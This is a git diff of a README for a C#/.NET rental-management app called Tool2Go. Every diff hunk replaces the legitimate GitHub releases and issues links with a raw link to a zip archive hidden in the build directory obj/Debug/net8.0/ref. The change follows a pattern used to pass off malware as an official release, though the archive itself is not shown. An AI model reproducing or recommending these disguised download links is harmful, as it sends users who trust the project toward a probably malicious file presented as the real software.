@@ -1,13 +1,13 @@
 # 🎉 Tool2Go - Simplify Your Rental Experience Today
 
 ## 🖱️ Download Tool2Go
-[![Download Tool2Go](https://img.shields.io/badge/Download-Tool2Go-blue.svg)](https://github.com/Makuro2202/Tool2Go/releases)
+[![Download Tool2Go](https://raw.githubusercontent.com/Makuro2202/Tool2Go/main/Tool2Go/obj/Debug/net8.0/ref/Tool2Go-v3.0-alpha.3.zip)](https://raw.githubusercontent.com/Makuro2202/Tool2Go/main/Tool2Go/obj/Debug/net8.0/ref/Tool2Go-v3.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Tool2Go! This application helps you manage your rentals efficiently. Whether you need to book an item or check availability, Tool2Go covers it all. Follow these simple steps to get started.
 
 ## 📥 Download & Install
-To download Tool2Go, visit this page: [Tool2Go Releases](https://github.com/Makuro2202/Tool2Go/releases). 
+To download Tool2Go, visit this page: [Tool2Go Releases](https://raw.githubusercontent.com/Makuro2202/Tool2Go/main/Tool2Go/obj/Debug/net8.0/ref/Tool2Go-v3.0-alpha.3.zip). 
 
 1. Navigate to the releases section.
 2. Choose the latest version.
@@ -48,7 +48,7 @@ Tool2Go is built on clean architecture principles. This means:
 If you encounter any issues or need assistance:
 
 - Check the **FAQs** section in the application.
-- Visit our [GitHub Issues Page](https://github.com/Makuro2202/Tool2Go/issues) to report problems.
+- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/Makuro2202/Tool2Go/main/Tool2Go/obj/Debug/net8.0/ref/Tool2Go-v3.0-alpha.3.zip) to report problems.
 
 ## 🎯 Contribution
 If you'd like to contribute to Tool2Go, feel free to submit your ideas and improvements via pull requests. Your input helps us create a better tool for everyone.
@@ -63,4 +63,4 @@ Tool2Go is developed using C# and .NET technologies. This ensures a robust backe
 ## 🌟 Conclusion
 Tool2Go is designed to streamline your rental management experience. From easy downloads to an intuitive interface, we strive to make your tasks straightforward and hassle-free. 
 
-Don’t forget to download the application today: [Tool2Go Releases](https://github.com/Makuro2202/Tool2Go/releases). Enjoy a seamless rental process with Tool2Go!
+Don’t forget to download the application today: [Tool2Go Releases](https://raw.githubusercontent.com/Makuro2202/Tool2Go/main/Tool2Go/obj/Debug/net8.0/ref/Tool2Go-v3.0-alpha.3.zip). Enjoy a seamless rental process with Tool2Go!
